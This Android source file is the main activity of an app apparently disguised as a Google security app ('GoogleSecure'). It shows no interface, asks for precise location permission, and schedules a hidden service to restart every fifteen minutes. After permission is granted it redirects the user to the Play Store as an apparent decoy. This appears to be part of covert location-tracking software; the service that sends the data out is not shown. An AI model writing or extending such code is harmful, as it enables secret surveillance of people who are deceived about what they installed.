package com.secure.google.googlesecure;

import android.Manifest;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;

public class MainActivity extends AppCompatActivity {

    String name=null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
       // setContentView(R.layout.activity_main);

    }

    void callService()
    {
        //if(isMyServiceRunning(GoogleService.class))
        {
            final AlarmManager alarmMgr = (AlarmManager)getSystemService(Context.ALARM_SERVICE);
            Intent set = new Intent(this,AlarmReciever.class);
            PendingIntent SetPending = PendingIntent.getBroadcast(getApplicationContext(), 100, set, PendingIntent.FLAG_UPDATE_CURRENT);
            alarmMgr.setRepeating(AlarmManager.ELAPSED_REALTIME,5000,AlarmManager.INTERVAL_FIFTEEN_MINUTES,SetPending);
        }
        finish();
    }
    private boolean isMyServiceRunning(Class<?> serviceClass) {
        ActivityManager manager = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceClass.getName().equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }

    @Override
    protected void onResume() {
        super.onResume();

        Context context = getApplicationContext();
        SharedPreferences sharedPref = context.getSharedPreferences(
                "GoogleSecure", Context.MODE_PRIVATE);
        name=sharedPref.getString("username",null);
        if(name==null)
        {
            Intent i=new Intent(this,SetName.class);
            startActivity(i);
        }
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M)
            getPermission();
        else
        {
            {
                Intent i = new Intent(this, GoogleService.class);
                stopService(i);
                //Toast.makeText(context, "starting service", Toast.LENGTH_SHORT).show();
                if (name != null)
                {
                    //startService(i);
                    callService();
                    try {
                        //startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps")));
                    } catch (android.content.ActivityNotFoundException anfe) {

                    }
                }
            }
        }
    }

    void getPermission()
    {
        if(ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)!= PackageManager.PERMISSION_GRANTED)
        {
            ActivityCompat.requestPermissions(this,new String[]{Manifest.permission.ACCESS_FINE_LOCATION},120);
        }
        else
        {
            {
                Intent i = new Intent(this, GoogleService.class);
                stopService(i);
                if (name != null)
                {
                   // startService(i);
                    callService();
                    try {
                       // startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps")));
                    } catch (android.content.ActivityNotFoundException anfe) {

                    }
                }
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if(grantResults.length>0 && grantResults[0]==PackageManager.PERMISSION_GRANTED)
        {
            {
                Intent i = new Intent(this, GoogleService.class);
                stopService(i);
                if (name != null)
                {
                    //startService(i);
                    callService();
                    try {
                        startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps")));
                    } catch (android.content.ActivityNotFoundException anfe) {

                    }
                }
            }
        }
    }
}
